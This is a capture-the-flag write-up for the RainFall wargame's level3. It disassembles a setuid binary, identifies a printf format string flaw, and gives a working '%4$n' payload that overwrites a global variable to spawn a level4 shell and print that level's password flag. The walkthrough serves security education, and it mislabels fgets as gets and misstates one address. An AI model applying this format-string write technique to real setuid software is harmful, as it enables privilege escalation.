Once we are logged as level3

We are presented with a suid binary.

We try executing it
level3@RainFall:~$ ./level3
asdf
asdf
level3@RainFall:~$ ltrace ./level3

It's obvious that it's printing the input buffer back.

Let's disassemble the executable using gdb.
Dump of assembler code for function main:
   0x0804851a <+0>:	push   ebp
   0x0804851b <+1>:	mov    ebp,esp
   0x0804851d <+3>:	and    esp,0xfffffff0
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler dump.
(gdb)

As it seems that the main functions calls for another function called v. Let's disassemble it using gdb
(gdb) disassemble v
Dump of assembler code for function v:
   0x080484a4 <+0>:	    push   ebp
   0x080484a5 <+1>: 	mov    ebp,esp
   0x080484a7 <+3>:	    sub    esp,0x218
   0x080484ad <+9>:	    mov    eax,ds:0x8049860
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.

The program reads input with gets function then print it using printf. Then it compares a variable with the value 0x40(64)
and if it's equal then it runs a shell using system function.

As you can see the executable is vulnerable to format string vulnerability and we can exploit it to change the value in the compared variable
to 64 so we can pass the condition and get a shell of level4.
level3@RainFall:~$ ./level3
%p
0x200
level3@RainFall:~$

The variable that the program compares with the address (0x0804898c) can be found using objdump
level3@RainFall:~$ objdump -t level3
level3:     file format elf32-i386

SYMBOL TABLE:
08048134 l    d  .interp	00000000              .interp
08048148 l    d  .note.ABI-tag	00000000              .note.ABI-tag
08048168 l    d  .note.gnu.build-id	00000000              .note.gnu.build-id
0804818c l    d  .gnu.hash	00000000              .gnu.hash
0804988c g     O .bss	00000004              m ------------>>>> Here is the variable

Writing n padding into the 4th argument.

So the command we need to inject is like this : (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"';cat)| ./level3

level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"';cat)| ./level3
ï¿½AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoai
/bin/sh: 1: whoai: not found
whoami
level4
pwd
/home/user/level3
cd /home/user/level4
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

As you see we got a shell and printed the level4 flag.

